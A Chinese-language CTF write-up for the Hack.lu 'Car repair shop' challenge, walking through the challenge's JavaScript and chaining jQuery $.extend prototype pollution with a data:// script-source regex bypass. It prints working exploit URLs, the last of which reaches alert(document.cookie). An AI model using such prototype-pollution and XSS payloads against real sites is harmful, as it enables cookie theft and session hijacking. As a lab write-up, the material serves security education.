> 原文链接: https://www.anquanke.com//post/id/189701 


# Hack.luCTF-Car-repair-shop详解


                                阅读量   
                                **761520**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p1.ssl.qhimg.com/t015a8f7e269a9a0ba3.jpg)](https://p1.ssl.qhimg.com/t015a8f7e269a9a0ba3.jpg)



JS题目，代码全在前端，合并一下关键代码如下：

```
const urlParams = new URLSearchParams(window.location.search)
const h = location.hash.slice(1)
const bugatti = new Car('Bugatti', 'T35', 'green', 'assets/images/bugatti.png')
const porsche = new Car('Porsche', '911', 'yellow', 'assets/images/porsche.png')

const cars = [bugatti, porsche]

porsche.repair = () =&gt; {
    if(!bugatti.isStarted()){
        infobox(`Not so fast. Repair the other car first!`)
    }
    else if($.md5(porsche) == '9cdfb439c7876e703e307864c9167a15'){
        if(urlParams.has('help')) {
            repairWithHelper(urlParams.get('help'))
        }
    }
    else{
        infobox(`Repairing this is not that easy.`)
    }
}
porsche.ignition = () =&gt; {
    infobox(`Hmm ... WTF!`)
}

$(document).ready(() =&gt; {
    const [car] = cars
    $('.fa-power-off').click(() =&gt; car.powerOn())
    $('.fa-car').click(() =&gt; car.info())
    $('.fa-lightbulb-o').click(() =&gt; car.light())
    $('.fa-battery-quarter').click(() =&gt; car.battery())
    $('.fa-key').click(() =&gt; car.ignition())
    $('.fa-wrench').click(() =&gt; car.repair())

    $('.fa-step-forward').click(() =&gt; nextCar())

    if(h.includes('Bugatti'))
        autoStart(bugatti)
    if(h.includes('Porsche'))
        autoStart(porsche)
})


const nextCar = () =&gt; {
    cars.push(cars.shift())
    $(".image").attr('src', cars[0].pic);
}


const autoStart = (car) =&gt; {
    car.repair()
    car.ignition()
    car.powerOn()
}


const repairWithHelper = (src) =&gt; {
    /* who needs csp anyways !? */
    urlRegx = /^w{4,5}://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
    if (urlRegx.test(src)) {
        let s = document.createElement('script')
        s.src = src
        $('head').append(s)
    }
}


const infobox = (text) =&gt; {
    $('a').css({'pointer-events': 'none', 'border': 'none'})
    $('.infobox').addClass('infoAnimate')
        .text(text)
        .on('animationend', function() {
            $(this).removeClass('infoAnimate')
            $('a').css({'pointer-events': 'all', 'border': 'solid 1px rgba(255, 255, 255, .25)'})
    })

}

class Car {
    constructor(type, model, color, pic, key="") {
        this.type = type
        this.model = model
        this.color = color
        this.key = key
        this.pic = pic

        let started = false
        this.start = () =&gt; {
            started = true
        }
        this.isStarted = () =&gt; {
            return started
        }
    }
    powerOn() {
        if (this.isStarted()) {
            infobox(`Well Done!`)
            nextCar()

        } else {
            $('.chargeup')[0].play()
        }
    }
    info() {
        infobox(`This car is a ${this.type} ${this.model} in ${this.color}. It looks very nice! But it seems to be broken ...`)
    }
    repair() {
        if(urlParams.has('repair')) {
            $.extend(true, this, JSON.parse(urlParams.get('repair')))
        }
    }
    light() {
        infobox(`You turn on the lights ... Nothing happens.`)
    }
    battery() {
        infobox(`Hmmm, the battery is almost empty ... Maybe i can repair this somehow.`)
    }
    ignition() {
        if (this.key == "") {
            infobox(`Looks like the key got lost. No wonder the car is not starting ...`)
        }
        if (this.key == "🔑") {
            infobox(`The car started!`)
            this.start()
        }
    }
}

&lt;!-- &lt;script src="assets/js/car.key.js"&gt;&lt;/script&gt; --&gt;
```

根据题目和代码逻辑，首先生成了两个常量对象`bugatti`和`porsche`

```
const bugatti = new Car('Bugatti', 'T35', 'green', 'assets/images/bugatti.png')
const porsche = new Car('Porsche', '911', 'yellow', 'assets/images/porsche.png')
```

通读代码找一下能够x的点，发现在`repairWithHelper`函数中存在script src可控的情况，不过传入的url要经过一个正则的限制。我们首先追一下怎么能调用到`repairWithHelper`函数

```
const repairWithHelper = (src) =&gt; {
    /* who needs csp anyways !? */
    urlRegx = /^w{4,5}://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
    if (urlRegx.test(src)) {
        let s = document.createElement('script')
        s.src = src
        $('head').append(s)
    }
}
```

Jquery加载完dom之后，取锚点的值为h，并判断是否包含bugatti、porsche字段值，而后将对象传入相应的autoStart函数执行。

```
if(h.includes('Bugatti'))
    autoStart(bugatti)
if(h.includes('Porsche'))
    autoStart(porsche)
```

autoStart中对car对象的调用方法不尽相同。对于bugatti来说，Car类中存在上述三个方法，而当对象为porsche的时候，方法ignition、repair会被改写。其中，在`porsche.repair()`方法中实现了`repairWithHelper`调用

```
const autoStart = (car) =&gt; {
    car.repair()
    car.ignition()
    car.powerOn()
}
```

省略中间步骤，梳理一下调用链大致需要经过两个重要的逻辑：

1、需要先repair第一辆名为”Bugatti”的车，改变bugatti.key = 🔑<br>
2、使$.md5(porsche) == $.md5(“lol”)

先看第一个点，由于Car类内部`ignition()`方法调用了$extend，同时获取url参数`repair`用来合并Car类内属性，那么就可以通过传参覆盖key的值，因此构造`repair={"key":"%F0%9F%94%91"}`就能轻松过第一个步骤。

```
repair() {
    if(urlParams.has('repair')) {
        $.extend(true, this, JSON.parse(urlParams.get('repair')))
    }
}
```

同时$extend()方法也存在原型链污染问题，见文章:https://hackerone.com/reports/454365。这也是bypass第二步$.md5(porsche) == $.md5(“lol”)的关键，那么如何操作对象常量porsche？

首先，可以先看下面的取值

[![](https://p4.ssl.qhimg.com/t01075444c8a5f52916.png)](https://p4.ssl.qhimg.com/t01075444c8a5f52916.png)

因为$.md5是对一串string类型的变量进行加密，那么传入的参数为对象时，势必就经过类型的转换。至于具体操作，我们可以把它理解为当前变量进行`toString()`。由于porsche这个对象没有`toString()`方法，按照Javascript的继承就会向上查找原型_**proto**(Car对象)是否有`toString()`，Car对象也没有`toString()`，继而再向上查找到**proto_**(Object对象)，存在toString()，调用并返回字符串：**[object Object]**，通过打印如下的例子验证。

[![](https://p2.ssl.qhimg.com/t015444ad34a08f5306.png)](https://p2.ssl.qhimg.com/t015444ad34a08f5306.png)

其次，对于数组的toString()会合并数组内的键值并返回，那么如下的用法会使$.md5生成以”lol”为字符串的加密值。

[![](https://p5.ssl.qhimg.com/t019d49d9563a3ad1ca.png)](https://p5.ssl.qhimg.com/t019d49d9563a3ad1ca.png)

因此，既然是将porsche对象进行$.md5的取值，那么我们污染继承链的某一个_**proto_**，使其为array类型，并赋值为”lol”，那么toString()在向上寻找调用的时候就能返回”lol”，而不是到达顶端Object原型的toString()方法。

综上，我们可以构造如下payload绕过以上两点的限制：

```
https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?&amp;repair={"key":"%F0%9F%94%91","__proto__":{"__proto__":["lol"]}}#PorscheBugatti
```

[![](https://p5.ssl.qhimg.com/dm/1024_121_/t01e54e79378e89cfd1.png)](https://p5.ssl.qhimg.com/dm/1024_121_/t01e54e79378e89cfd1.png)

接着就是以help为参数的引入script标签的src，不过要先bypass一段正则:

```
urlRegx = /^w{4,5}://car-repair-shop.fluxfingersforfuture.fluxfingers.net/[wd]+/.+.js$/;
```

这里是不可能污染原型的，因为会被重新赋值。可控点为car-repair-shop前后的字段。

参考官方wp解法，由于w{4,5}使得协议可控，用data://作为资源加载恶意的xss，同时data不关心mime的类型，使得我们可以把白名单的host放到mime的位置。其实对于src这个属性来说，应该是都支持data资源的调用。最终payload如下:

```
https://car-repair-shop.fluxfingersforfuture.fluxfingers.net/?help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/hpdoger/,alert(document.cookie)//car.key.js&amp;repair={"key":"🔑","__proto__":{"__proto__":["lol"]}}#BugattiPorsche
```

[![](https://p5.ssl.qhimg.com/t019fd50377d6fa6b63.png)](https://p5.ssl.qhimg.com/t019fd50377d6fa6b63.png)

javascript调用链及类型转换真的可以去深究一下，师傅们博学多识,orz..
